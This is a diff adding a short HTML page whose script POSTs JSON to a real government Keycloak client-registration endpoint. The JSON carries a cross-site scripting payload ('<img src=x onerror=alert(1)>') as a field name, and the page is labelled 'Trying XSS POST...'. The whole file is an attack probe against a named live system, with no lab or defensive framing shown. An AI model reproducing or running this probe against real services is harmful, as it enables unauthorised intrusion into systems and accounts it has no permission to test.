@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    fetch("https://pmt-accounts.komdigi.go.id/auth/realms/master/clients-registrations/default", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        "<img src=x onerror='alert(1)'>": 1
+      })
+    });
+  </script>
+  <h1>Trying XSS POST...</h1>
+</body>
+</html>
